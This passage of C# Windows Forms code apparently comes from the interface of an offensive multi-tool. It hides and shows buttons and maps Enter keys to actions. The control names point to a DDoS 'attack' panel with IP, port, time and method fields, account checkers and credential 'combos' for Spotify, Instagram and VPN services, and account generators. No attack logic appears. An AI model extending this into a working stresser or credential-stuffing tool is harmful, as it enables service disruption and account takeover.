            XTurboBtn.Visible = false;
            NitroBtn.Visible = false;
            TikTokBtn.Visible = false;
            DSearchBtn.Visible = false;
            DGenBtn.Visible = false;
            CombosBtn.Visible = false;
            SpotifyBtn.Visible = false;
            IGBtn.Visible = false;
            VYPRBtn.Visible = false;
            NordBtn.Visible = false;
            C1Btn.Visible = false;
            C2Btn.Visible = false;
            C3Btn.Visible = false;
            C4Btn.Visible = false;
            GeoIPTb.Visible = false;
            GeoBtn.Visible = false;
            PingIPTb.Visible = false;
            PingBtn.Visible = false;
            TCPPingIPTb.Visible = false;
            TCPPortTb.Visible = false;
            TCPBtn.Visible = false;
            IPTb.Visible = false;
            PortTb.Visible = false;
            TimeTb.Visible = false;
            MethodTb.Visible = false;
            StartBtn.Visible = false;
            MethodsBtn.Visible = false;
            attackprogressBar.Visible = false;
            CTOBtn.Visible = false;
            SaikoIGBtn.Visible = false;
            DiscordBtn.Visible = false;
            ActiveUserTb.Visible = false;
            MembershipTb.Visible = false;
            TimeLeftTb.Visible = false;
            LogoPb.Visible = true;
            AgreeBtn.Visible = false;
            BackBtn.Visible = false;
            ExitBtn.Visible = false;
            Rules1Tb.Visible = false;
            Rules2Tb.Visible = false;
            Rules3Tb.Visible = false;
            Rules4Tb.Visible = false;
            Rules5Tb.Visible = false;
        }

        private void ExitBtn_Click(object sender, EventArgs e)
        {
            this.Close();
        }

        private void Checkers2Btn_Click(object sender, EventArgs e)
        {
            SpotifyBtn.Visible = false;
            IGBtn.Visible = false;
            VYPRBtn.Visible = false;
            NordBtn.Visible = false;
            Checkers2Btn.Visible = false;
            CheckersBtn.Visible = true;
        }

        private void Combos2Btn_Click(object sender, EventArgs e)
        {
            C1Btn.Visible = false;
            C2Btn.Visible = false;
            C3Btn.Visible = false;
            C4Btn.Visible = false;
            Combos2Btn.Visible = false;
            CombosBtn.Visible = true;
        }

        private void PassTb_KeyDown(object sender, KeyEventArgs e)
        {
            if (e.KeyCode == Keys.Enter)
            {
                Login2Btn.PerformClick();
            }
        }

        private void MethodTb_KeyDown(object sender, KeyEventArgs e)
        {
            if (e.KeyCode == Keys.Enter)
            {
                StartBtn.PerformClick();
            }
        }

        private void AccountTypeTb_KeyDown(object sender, KeyEventArgs e)
        {
            if (e.KeyCode == Keys.Enter)
            {
                GenBtn.PerformClick();
            }
        }

        private void TokenTb_KeyDown(object sender, KeyEventArgs e)
        {
            if (e.KeyCode == Keys.Enter)
            {
                Reg2Btn.PerformClick();
            }
        }

        private void PingIPTb_KeyDown(object sender, KeyEventArgs e)
        {
            if (e.KeyCode == Keys.Enter)
            {
                PingBtn.PerformClick();
            }
        }

        private void GeoIPTb_KeyDown(object sender, KeyEventArgs e)
        {
            if (e.KeyCode == Keys.Enter)
            {
                GeoBtn.PerformClick();
            }
        }

        private void TCPPingIPTb_KeyDown(object sender, KeyEventArgs e)
        {
            if (e.KeyCode == Keys.Tab)
            {
                TCPPortTb.Focus();
            }
        }

        private void TCPPortTb_KeyDown(object sender, KeyEventArgs e)
        {
            if (e.KeyCode == Keys.Enter)
            {
                TCPBtn.PerformClick();
            }
        }
    }
}
